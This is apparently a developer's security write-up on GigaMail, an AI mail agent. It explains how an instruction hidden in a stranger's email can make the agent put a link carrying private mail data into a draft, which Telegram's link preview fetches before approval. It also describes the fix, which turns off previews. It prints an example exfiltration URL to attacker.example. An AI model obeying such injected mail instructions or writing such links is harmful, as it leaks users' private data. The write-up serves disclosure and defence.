A link preview sent data out before anyone approved the draft.

An approval step protects what happens after you say yes. It does not protect what happens on the way to you.

The draft that leaked on arrival

GigaMail can send a draft to your phone on Telegram, so you can read it and approve or reject it. The agent that writes the draft has read your mail, and some of that mail is written by strangers. An instruction hidden in one of them (we described how in the article on hidden text) can ask the agent for something simple: put this link in the draft.

Hello, I will confirm on Tuesday.
https://attacker.example/?d=SUBJECT-OF-A-PRIVATE-MAIL

An invented draft. The address after d= is whatever the hostile mail asked the agent to copy there.

Nobody has to tap that link. Telegram fetches the first link of a message from its own servers to build the preview shown under it, as soon as the message is sent. So the request reached attacker.example, with the data in its address, at the moment the draft arrived on the phone: before you read it, and whether you then approved it or not.

Why the approval did not help

In GigaMail, sending, replying and deleting wait for a person's approval that the agent cannot give. That gate decides what leaves as an email. This leak was not an email. It was a side effect of showing the draft for approval: the step that is meant to be the safe one carried the data out by itself.

The shape is general. A channel that displays an agent's output, and that follows links on its own to decorate them, turns every link the agent writes into a request somebody else's server makes. We have not checked other chat or ticket tools, so we name none; the question is worth asking of any of them.

What changed

Since GigaMail 0.6.7, every text GigaMail sends to Telegram asks Telegram not to build a link preview. The example notify command shipped in policy.py, which people copy when they write their own, does the same. The link is still in the message, as text. Nothing fetches it unless you do.

The fix is small: the fetch is switched off, so there is no list of "safe" links to get wrong.

What it does not solve

  • Links you tap. If you open the link in a draft, your browser makes the request, with whatever is in the address. Read the draft before you approve it, links included.
  • Other ways out. This closes one route. An agent that has read a hostile mail is still untrusted, which is why what it can send is gated and what it can read is narrowed.
  • The channel itself. Drafts shown on Telegram are readable to anyone who holds the bot token; SECURITY.md lists the limits of approving from Telegram.

Sources. The change is the entry "Telegram messages have no link preview" under v0.6.7 in the GigaMail changelog; the limits are in SECURITY.md. We did not test Telegram's fetching ourselves for this article beyond what the changelog records.
